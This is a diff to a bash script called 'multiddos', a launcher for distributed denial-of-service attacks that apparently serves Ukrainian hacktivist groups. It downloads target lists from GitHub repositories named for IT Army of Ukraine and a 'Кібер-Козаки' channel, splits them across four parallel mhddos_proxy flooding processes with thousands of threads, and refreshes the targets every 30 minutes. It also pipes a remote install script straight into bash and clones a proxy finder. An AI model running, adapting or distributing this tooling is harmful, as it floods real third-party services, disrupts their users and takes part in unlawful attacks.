@@ -1,11 +1,12 @@
 #!/bin/bash
+# curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v0.9.1\n"
+clear && echo -e "Loading... v1.0\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
-sudo apt-get install -q -y tmux toilet python3 python3-pip 
+sudo apt-get install -q -y tmux jq toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
-rm -rf ~/multidd ~/multiddos #delete main (multidd) and just in case also relic (multiddos) folder
 pkill -f start.py; pkill -f runner.py; #stop old processes if they still running
+rm -rf ~/multidd*; mkdir -p ~/multidd/targets/ ; cd ~/multidd # clean working folder 
 
 # create swap file if system doesn't have it. Helps systems with very little RAM.
 if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
@@ -26,44 +27,42 @@ export -f typing_on_screen
 if [[ $docker_mode != "true" ]]; then
     gotop="on"
     db1000n="off"
-    uashield="off"
     vnstat="off"
     proxy_finder="off"
 fi
 
-if [[ $t_set_manual != "on" ]]; then export threads="-t 5000"; fi # default threads if not passed in cmd line
+if [[ $t_set_manual != "on" ]]; then export threads="-t 2500"; fi # default threads if not passed in cmd line
 if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default proxy_threads if not passed in cmd line
 
-### prepare target files (main and secondary)
+### prepare target files and show banner
 prepare_targets_and_banner () {
-export targets_curl="/var/tmp/curl.uaripper"
-export targets_uniq="/var/tmp/uniq.uaripper"
-export targets_lite="/var/tmp/lite.uaripper"
-rm -f /var/tmp/*uaripper #remove previous copies
+rm -rf ~/multidd/targets/*
 
-# read targets from github, exclude comments and empty lines, put valid addresses on new line
-echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets)" | while read LINE; do
-    if [[ "$LINE" != "#"* ]] && [ "$LINE" != "" ] ; then
-        for i in $LINE; do
-            if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
-                echo $i >> $targets_curl
-            fi
-        done
+# 1 DDOS по країні СЕПАРІВ (Кібер-Козаки)          https://t.me/ddos_separ
+echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > ~/multidd/targets/source1.txt
+# 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
+echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > ~/multidd/targets/source2.txt
+echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr')" > ~/multidd/targets/source3.txt
+
+# skip wrong lines in sources (those happens) and combine all sources together in single file all_targets.txt
+cat ~/multidd/targets/source* | while read LINE; do
+    if [[ $LINE == "http"* ]] || [[ $LINE == "tcp://"* ]]; then
+        echo $LINE >> ~/multidd/targets/all_targets.txt
     fi
 done
 
-# find only uniq targets, randomize order and save them in $targets_uniq
-cat $targets_curl | sort | uniq | sort -R > $targets_uniq
+# delete duplicates, randomize order and save final targets in uniq_targets.txt
+cat ~/multidd/targets/all_targets.txt | sort | uniq | sort -R > ~/multidd/targets/uniq_targets.txt
 
-# Print greetings and number of targets; yes, utility name "toilet" is unfortunate
+# Print greetings and number of targets; yes, app name "toilet" is unfortunate
 clear
 toilet -t --metal "Український"
 toilet -t --metal "   жнець"
 toilet -t --metal " MULTIDDOS"
 typing_on_screen 'Шукаю завдання...' ; sleep 0.5
-echo -e "\n\nTotal targets found:" "\x1b[32m $(cat $targets_curl | wc -l)\x1b[m" && sleep 0.1
-echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
-echo -e "\nЗавантаження..."; sleep 3
+echo -e "\n\nTotal targets found:" "\x1b[32m $(cat ~/multidd/targets/all_targets.txt | wc -l)\x1b[m" && sleep 0.1
+echo -e "Uniq targets:" "\x1b[32m $(cat ~/multidd/targets/uniq_targets.txt | wc -l)\x1b[m" && sleep 0.1
+echo -e "\nЗавантаження..."; sleep 2
 clear
 }
 export -f prepare_targets_and_banner
@@ -71,7 +70,6 @@ export -f prepare_targets_and_banner
 launch () {
 # kill previous sessions or processes in case they still in memory
 tmux kill-session -t multidd > /dev/null 2>&1
-sudo pkill node shield> /dev/null 2>&1
 
 # tmux mouse support
 grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
@@ -98,10 +96,6 @@ if [[ $db1000n == "on" ]]; then
     tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 fi
 
-if [[ $uashield == "on" ]]; then
-    tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
-fi
-
 if [[ $proxy_finder == "on" ]]; then
     tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
 fi
@@ -111,40 +105,42 @@ tmux attach-session -t multidd
 while [ "$1" != "" ]; do
     case $1 in
         +d | --db1000n )   db1000n="on"; shift ;;
-        +u | --uashield )   uashield="on"; shift ;;
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
         --lite ) export lite="on"; shift ;;
         --plite ) export lite="on"; export proxy_threads=1000; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
-        *   ) export args_to_pass+=" $1"; shift ;;
+        *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
     esac
 done
 
 prepare_targets_and_banner
 
 # create small separate script to re-launch only this small part of code
+cd ~/multidd
 cat > auto_bash.sh << 'EOF'
-# Restart and update everything (mhddos_proxy and targets) every 30 minutes
+# Restart and update mhddos_proxy and targets every 30 minutes
 while true; do
     #install mhddos_proxy
-    rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd
+    cd ~/multidd/
     git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
-    cd mhddos_proxy
+    cd ~/multidd/mhddos_proxy
     python3 -m pip install -r requirements.txt
 
     if [[ $lite == "on" ]]; then
-        tail -n 2000 $targets_uniq > $targets_lite
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 5000 &
+        tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods $args_to_pass -t 2000 &
     else
-        cd /var/tmp/; split -n l/2 --additional-suffix=.uaripper $targets_uniq; cd - #split targets in 2
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xaa.uaripper $methods $threads $args_to_pass &
-        sleep 5 # to decrease load on cpu during simultaneous start
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $threads $args_to_pass &
+        cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in N parts
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods $threads $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods $threads $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods $threads $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods $threads $args_to_pass &
     fi
 sleep 30m
 pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
+rm -rf ~/multidd/mhddos_proxy/
 done
 EOF
 
